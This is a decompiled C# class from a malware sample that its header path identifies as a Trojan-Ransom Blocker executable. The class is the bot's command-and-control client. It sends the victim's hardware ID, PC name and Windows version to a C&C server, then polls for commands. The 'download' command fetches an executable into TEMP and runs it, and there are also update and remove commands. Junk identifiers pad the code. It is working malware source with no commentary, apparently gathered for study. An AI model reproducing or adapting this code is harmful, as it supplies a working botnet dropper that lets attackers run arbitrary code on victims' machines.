// Decompiled with JetBrains decompiler
// Type: Stub.cControl
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BA203B70-52B4-43DD-9516-EA18553D96E9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.kkgw-8e72291dbb8e4aa6712f14fa18b02e55d5f40951d0764f8c49f68f5491792776.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace Stub
{
  internal class cControl
  {
    public bool fsdgsdfsdasdffgssdfgdfdfs = true;
    public bool fsdgsasdasdfdfsdfsdfgsdfdfs = true;
    public bool fsdgsdfaasdf43asdfsasdfsdfgsdfdfs = true;
    public bool fsdgsdasasdfwerdffsdfgsdfdfs = true;
    public bool fsdgasdfsdasf43dfsdfgsdfdfs = true;
    public bool fsdgasdfhdgs342dfsdfgsdfdfs = true;
    public bool fsdgasdfdgjs234dfsdfgsdfdfs = true;
    public bool fsdgasdfsdf23sddfdfgsdfdfs = true;
    public bool fsdgasdf2345sdfssdfdfgsdfdfs = true;
    public bool fsdasdfsd6sdffsdfgsdfdfs = true;
    public bool fsdaasdgsdf34sdfsdfgsdfdfs = true;
    public bool fsdgasdfsdf34fhsdfgsdfdfs = true;
    public bool fsdgasdfs346dfsssfgdfgsdfdfs = true;
    public bool fsdgasdfsd354fsdfgsdfgsdfdfs = true;
    public bool fsdgasdfsd56fsdfgsdfgsdfdfs = true;
    public bool fsdgasdfsd567ffgsdfgsdfdfs = true;
    public int sdfggsdfgs4sdfdf = 1;
    public int sdfggsdfsd4fgssdfdf = 1;
    public int sdfggsdsdf4fgssdfdf = 1;
    public int sdfggasdsd4fgssdfdf = 1;
    public int sdfggshdfg4ssdfdf = 1;
    public int sdfggsdfgs4dfasdssdfdf = 1;
    public int sdfgasdasd4ggsdfgssdfdf = 1;
    public int sdfggsdfhd4fsdfgssdfdf = 1;
    public int sdfggsasds4gjfdfgssdfdf = 1;
    public int sdfggghlsd4fgssdfdf = 1;
    public int sdfggsghdf4gssdfdf = 1;
    public int sdfgfjfgsd4fgssdfdf = 1;
    public int sdfgdghjgs4dfgssdfdf = 1;
    public int sdfggbzxcv4bsdfgssdfdf = 1;
    public int sdfggxcvgs4dfdfsdfgsdfgssdfdf = 1;
    public int sdfggjdfjd4fgsdgsdfgssdfdf = 1;
    public int sdfgxcvbxv4gsdfgssdfdf = 1;
    public int sdfggsxcvb4nxgsgjdfgssdfdf = 1;
    public int sdfzxcfgas4dghggsdfgssdfdf = 1;
    public int sdfgassdgv4sdghsgsdfgssdfdf = 1;
    public int sdfggsfgjh4dfgsdfgssdfdf = 1;
    public int sdfggsdadf4sdfbcfgssdfdf = 1;
    public int sdfdfshshd4fggsdfgssdfdf = 1;
    public int sdfggsfhsg4dfdfgssdfdf = 1;
    public int fhsfhdfdsf4hsdfhsdfsdfsdfhdfh = 1;
    public int sdfggssdhh4dfgssdfdf = 1;
    public int sdfggsdfgs4sdsdfgdfgsdfdf = 1;
    public int sdfggsdfdf4hfdghdfsgssdfdf = 1;
    public int sdfggasdff4gasdgsdfgssdfdf = 1;
    public int sdfggsddfj4dfjghfxgssdfdf = 1;
    public bool fsdgsdfsd4fgssdfgdfdfs = true;
    public bool fsdgsasdf4dfsdfsdfgsdfdfs = true;
    public bool fsdgsdfa443asdfsasdfsdfgsdfdfs = true;
    public bool fsdgsdasw4erdffsdfgsdfdfs = true;
    public bool fsdgsdasf443dfsdfgsdfdfs = true;
    public bool fsdghdgs3442dfsdfgsdfdfs = true;
    public bool fsdgdgjs2434dfsdfgsdfdfs = true;
    public bool fsdgsdf23s4ddfdfgsdfdfs = true;
    public bool fsdg2345sd4fssdfdfgsdfdfs = true;
    public bool fsdgsd6sdff4sdfgsdfdfs = true;
    public bool fsdgsdf34sdf4sdfgsdfdfs = true;
    public bool fsdgsdf34fhsd4fgsdfdfs = true;
    public bool fsdgs346dfsssf4gdfgsdfdfs = true;
    public bool fsdgsd354fsdfgs4dfgsdfdfs = true;
    public bool fsdgsd56fsdfgsdf4gsdfdfs = true;
    public bool fsdgsd567ffgsdfgs4dfdfs = true;
    private string sOldCommand = string.Empty;

    private void sdfgssdfgsdfgsdfdgsdfgassdfgsdfgdfsdfgsdfgsdfdf() => this.sdfggghlsd4fgssdfdf = 10;

    private void sdfgssdfgsdfgdgssdfgasdfdfgsdfsadfgsdfgsdfdf() => this.sdfgxcvbxv4gsdfgssdfdf = 30;

    private void sdfgsdgsdgsdfwfhdxcergdfsdfgsdfgsdfgsdfdf() => this.sdfggsdfsd4fgssdfdf = 345;

    private void sdfgsd34dfgsszxcsdsaASdfgsdfdfgsdfgsdfgsdfdf() => this.sdfggsdfsd4fgssdfdf = 122;

    private void sdfgsdgsdfgsadAdfgsdfgsdfdf() => this.fhsfhdfdsf4hsdfhsdfsdfsdfhdfh = 34534;

    public void ConnectControl()
    {
      this.registerCCServer();
      new Thread(new ThreadStart(this.getCCServerCommand)).Start();
    }

    private void sdfgsd34dZSDFSADfgsszxcsdsaASdfgsdfdfgsdfgsdfgsdfdf() => this.sdfggghlsd4fgssdfdf = 122;

    private void sdfgsdgsdfFSDZgsadAdfgsdfgsdfdf() => this.sdfggshdfg4ssdfdf = 34534;

    private void registerCCServer()
    {
      string Parameters = "mode=0&hwid=" + cMain.ConfigClass.sHWID + "&botver=" + cMain.ConfigClass.sBotVersion + "&pcname=" + cMain.ConfigClass.sPCName + "&winver=" + cMain.ConfigClass.sWinVersion;
      while (true)
      {
        try
        {
          string str = this.HTTPRequest(cMain.ConfigClass.sCServerAddress, Parameters);
          if (str.Length > 0)
          {
            if (str == cMain.ConfigClass.sAuthCode)
              break;
            Environment.Exit(-1);
          }
        }
        catch
        {
        }
        Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 60 * 1000);
      }
    }

    private void getCCServerCommand()
    {
      string Parameters = "mode=1&hwid=" + cMain.ConfigClass.sHWID;
      while (true)
      {
        try
        {
          string sCommand = this.HTTPRequest(cMain.ConfigClass.sCServerAddress, Parameters);
          if (sCommand.Length > 0)
          {
            if (sCommand != this.sOldCommand)
            {
              this.handleCommand(sCommand);
              this.sOldCommand = sCommand;
            }
          }
          else
            this.sOldCommand = string.Empty;
        }
        catch
        {
        }
        Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 60 * 1000);
      }
    }

    private string HTTPRequest(string URI, string Parameters)
    {
      ServicePointManager.Expect100Continue = false;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(URI);
      httpWebRequest.ContentType = "application/x-www-form-urlencoded";
      httpWebRequest.Method = "POST";
      httpWebRequest.UserAgent = cMain.ConfigClass.sAuthCode;
      byte[] bytes = Encoding.ASCII.GetBytes(Parameters);
      httpWebRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      WebResponse response = httpWebRequest.GetResponse();
      return response == null ? string.Empty : new StreamReader(response.GetResponseStream()).ReadToEnd().Trim();
    }

    private void handleCommand(string sCommand)
    {
      string[] strArray = new string[0];
      try
      {
        strArray = sCommand.Split('*');
      }
      catch
      {
      }
      switch (strArray[0])
      {
        case "download":
          try
          {
            string str = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
            new WebClient().DownloadFile(Convert.ToString(strArray[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + str);
            new Process()
            {
              StartInfo = {
                FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\" + str)
              }
            }.Start();
            break;
          }
          catch
          {
            break;
          }
        case "update":
          cMain.SystemClass.updateBot(Convert.ToString(strArray[1]));
          break;
        case "remove":
          if (!(strArray[1] == Environment.MachineName) && !(strArray[1].ToUpper() == "ALL"))
            break;
          cMain.SystemClass.RemoveBot();
          break;
      }
    }
  }
}
